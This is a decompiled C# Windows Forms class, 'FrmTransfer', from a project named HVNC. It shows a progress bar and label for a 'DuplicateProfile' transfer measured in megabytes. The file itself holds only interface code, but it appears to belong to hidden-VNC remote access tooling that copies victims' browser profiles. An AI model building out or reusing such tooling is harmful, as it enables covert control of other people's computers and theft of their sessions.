using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	// Token: 0x0200001D RID: 29
	public partial class FrmTransfer : Form
	{
		// Token: 0x17000024 RID: 36
		// (get) Token: 0x060000CD RID: 205 RVA: 0x00002603 File Offset: 0x00000803
		// (set) Token: 0x060000CE RID: 206 RVA: 0x0000260B File Offset: 0x0000080B
		public ProgressBar DuplicateProgesse
		{
			get
			{
				return this.DuplicateProgess;
			}
			set
			{
				this.DuplicateProgess = value;
			}
		}

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x060000CF RID: 207 RVA: 0x00002614 File Offset: 0x00000814
		// (set) Token: 0x060000D0 RID: 208 RVA: 0x0000261C File Offset: 0x0000081C
		public Label FileTransferLabele
		{
			get
			{
				return this.FileTransferLabel;
			}
			set
			{
				this.FileTransferLabel = value;
			}
		}

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x060000D1 RID: 209 RVA: 0x00002625 File Offset: 0x00000825
		// (set) Token: 0x060000D2 RID: 210 RVA: 0x0000262D File Offset: 0x0000082D
		public Label PingTransfor
		{
			get
			{
				return this.PingTransform;
			}
			set
			{
				this.PingTransform = value;
			}
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x00002636 File Offset: 0x00000836
		public FrmTransfer()
		{
			this.int_0 = 0;
			this.InitializeComponent();
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x000024F0 File Offset: 0x000006F0
		private void FrmTransfer_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x0000CD24 File Offset: 0x0000AF24
		public void DuplicateProfile(int int_1)
		{
			if (int_1 > this.int_0)
			{
				int_1 = this.int_0;
			}
			this.FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(this.int_0) + " MB";
			this.DuplicateProgess.Value = int_1;
		}

		// Token: 0x0400008F RID: 143
		public int int_0;
	}
}
